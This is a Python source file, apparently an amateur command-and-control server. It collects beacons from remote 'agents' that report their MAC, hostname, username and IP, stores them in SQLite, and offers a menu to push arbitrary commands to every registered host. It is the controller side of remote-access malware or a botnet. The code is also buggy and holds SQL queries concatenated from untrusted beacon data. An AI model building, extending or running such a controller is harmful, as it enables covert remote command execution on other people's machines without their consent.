# I'm Malav and I can't get python to work
import socket
import select
import string
import sys
import os
import subprocess
import base64
import threading
import json
import sqlite3
import time

from sqlite3 import Error

def getAgents():
    #Vasu fix this kthx bye!
    #Select IP, HOSTNAME, LASTCHECKED where lastseen < 5 mins
    #print in format hostname@IP, last see @ LASTCHECKED
    agentcon = sql_connection()
    cursorObj = agentcon.cursor()
    cursorObj.execute("SELECT ip, Hostname, lastseen FROM beacons")
    result = cursorObj.fetchall()
    for i in result:
        print(i[0] + "@" + i[1] + " - Last seen:" + i[2])
    
    
def runAganistAll():
    lst = ['localhost']
    for i in lst:
        PORT = 65432        # The port used by the server

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((i, PORT))
            s.sendall(b'pwd')
            s.close()
            
def doCommand(command):
    print("Running command: " + command)
    agentcon = sql_connection()
    cursorObj = agentcon.cursor()
    cursorObj.execute("SELECT ip FROM beacons")
    result = cursorObj.fetchall()
    for i in result:
        print(i)
        PORT = 7025        # The port used by the server

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((str(i[0]), PORT))
            s.sendall(bytearray(command))
            s.close()
            
        print(i)
    time.sleep(3)
    main_menu()


def main_menu():
    os.system('clear')
    
    print("Welcome,\n")
    print("Please choose what you want to do:")
    print("1. View agents")
    print("2. Run command against all")
    print("\n0. Quit")
    choice = input(" >>  ")
    exec_menu(choice)

    return

def exec_menu(choice):
    os.system('clear')
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print("Invalid selection, please try again.\n")
            menu_actions['main_menu']()
    return

def menu1():
    print("List of all active agents!")
    print("9. Back")
    print("0. Quit")
    print('\n')
    getAgents()
    choice = input(" >>  ")
    exec_menu(choice)
    return

def menu2():
    print ("Type a command, or return to the main menu!\n")
    print ("9. Back")
    print ("0. Quit" )
    choice = input(" >>  ")
    if(choice != "9" or choice != "0"):
        doCommand(choice)
    else:
        exec_menu(choice)
    return

def back():
    menu_actions['main_menu']()

def exit():
    if os.path.exists("mydatabase.db"):
        os.remove("mydatabase.db")
        sys.exit()
    else:
        print("Error cleaning DB") 
        print("Please manually clear db")
        time.sleep(3)
        sys.exit()

def sql_connection():
    try:
        con = sqlite3.connect('mydatabase.db')
        return con
    except Error:
        print(Error)


def sql_init(con):
    cursorObj = con.cursor()
    cursorObj.execute(
        "CREATE TABLE beacons(uid int PRIMARY KEY, MAC text, Hostname text, Username text, ip text, lastseen text)")
    cursorObj.execute(
        "CREATE TABLE commands(uid int PRIMARY KEY, command text, result text)")
    con.commit()


def sql_insertBeacon(con, entity):
    cursorObj = con.cursor()
    cursorObj.execute(
        'INSERT INTO beacons(uid, MAC, Hostname, Username, ip, lastseen) VALUES(?, ?, ?, ?, ?, ?)', entity)
    con.commit()


def sql_getUID(con, mac):
    cursorObj = con.cursor()
    cursorObj.execute("SELECT uid FROM beacons WHERE MAC = \"" + str(mac) + "\"")
    result = cursorObj.fetchone()
    return result[0]

def sql_delete(con, mac):
    cursorObj = con.cursor()
    cursorObj.execute("DELETE FROM beacons WHERE MAC = \"" + str(mac) + "\"")

def noBeacon(con, mac):
    # return true if no beacon exists
    cursorObj = con.cursor()
    cursorObj.execute("SELECT uid FROM beacons WHERE MAC = \"" + str(mac) + "\"")
    result = cursorObj.fetchone()
    
    if(result):
        return False
    return True


def jsonVal(decodedValue):
    return json.loads(decodedValue)


def beaconHandler():
    HOST = '0.0.0.0'  # Standard loopback interface address (localhost)
    PORT = 65321        # Port to listen on (non-privileged ports are > 1023)
    UID = 0
    con = sql_connection()
    sql_init(con)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        while True:
            s.listen()
            
            conn, addr = s.accept()
            with conn:
                
                data = conn.recv(1024)
                if not data:
                    conn.close()
                # Beacon SQL Stuff
                jsonStr = jsonVal(str(base64.b64decode(data).decode('utf-8')))
                if(jsonStr["Type"] == True):
                    if(noBeacon(con, jsonStr["Mac"])):
                        
                        entities = (UID, jsonStr["Mac"], jsonStr["Hostname"],
                                    jsonStr["username"], jsonStr["devIp"], jsonStr["time"])
                        sql_insertBeacon(con, entities)
                        UID = UID+1
                    else:
                        
                        entities = (sql_getUID(con, jsonStr["Mac"]), jsonStr["Mac"], jsonStr["Hostname"],
                                    jsonStr["username"], jsonStr["devIp"], jsonStr["time"])
                        sql_delete(con, jsonStr["Mac"])
                        sql_insertBeacon(con, entities)
                else:
                    print("SQL ERROR")
                conn.close()

#########################################################################


def main():
    x = threading.Thread(target=beaconHandler)
    x.start()
    port = 7025
    main_menu()


menu_actions = {
    'main_menu': main_menu,
    '1': menu1,
    '2': menu2,
    '9': back,
    '0': exit,
}

if __name__ == "__main__":
    main()
